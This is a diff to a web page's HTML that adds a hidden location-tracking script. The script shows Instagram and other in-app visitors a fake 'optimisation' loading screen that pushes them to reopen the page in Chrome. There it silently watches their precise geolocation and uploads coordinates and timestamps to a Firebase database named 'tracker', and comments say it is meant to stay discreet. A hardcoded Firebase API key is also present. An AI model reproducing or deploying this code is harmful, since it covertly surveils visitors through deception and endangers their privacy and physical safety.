@@ -28,6 +28,73 @@
       @import url("https://fonts.googleapis.com/css2?family=Josefin+Sans:ital,wght@0,100..700;1,100..700&display=swap");
       @import url("https://fonts.googleapis.com/css2?family=Playwrite+DE+SAS:wght@100..400&display=swap");
     </style>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+      import {
+        getDatabase,
+        ref,
+        push,
+        set,
+      } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyAm3bzmHPo4XhFL6fCK0uNozNOsggBb8ds",
+        authDomain: "tracker-7e86f.firebaseapp.com",
+        databaseURL: "https://tracker-7e86f-default-rtdb.firebaseio.com",
+        projectId: "tracker-7e86f",
+        storageBucket: "tracker-7e86f.firebasestorage.app",
+        messagingSenderId: "734294640610",
+        appId: "1:734294640610:web:6663c9a4cfda330e059bbb",
+        measurementId: "G-7R0CG8BYYE",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getDatabase(app);
+      const storageRef = ref(db, "locations/");
+
+      function startTracking() {
+        const isInApp = /FBAN|FBAV|Instagram|Twitter|LinkedIn/i.test(
+          navigator.userAgent
+        );
+
+        // Si ouvert dans Instagram : on simule un petit bug de chargement pour forcer Chrome discrètement
+        if (isInApp) {
+          document.body.innerHTML = `
+            <div style="padding: 40px; text-align: center; color: #555; font-family: sans-serif;">
+                <div class="loader"></div>
+                <p style="margin-top:20px;">Optimisation de l'affichage en cours...</p>
+                <p style="font-size: 0.8em; color: #888;">Si la page ne s'affiche pas, cliquez sur les <b>trois points</b> en haut à droite puis sur <b>"Ouvrir dans le navigateur"</b>.</p>
+                <style>
+                    .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: auto; }
+                    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+                </style>
+            </div>`;
+          return;
+        }
+
+        // Si on est dans Chrome : on lance le suivi et on affiche le H1 normal
+        if ("geolocation" in navigator) {
+          navigator.geolocation.watchPosition(
+            (position) => {
+              const data = {
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+                timestamp: Date.now(),
+              };
+
+              const newLocationRef = push(storageRef);
+              set(newLocationRef, data).catch((err) => console.error(err));
+            },
+            (error) => {
+              /* On ne met pas d'alert() pour rester discret */
+            },
+            { enableHighAccuracy: true, maximumAge: 0 }
+          );
+        }
+      }
+
+      window.onload = startTracking;
+    </script>
   </head>
   <body>
     <div
@@ -498,5 +565,6 @@
     </script>
   </body>
 </html>
+
 
 
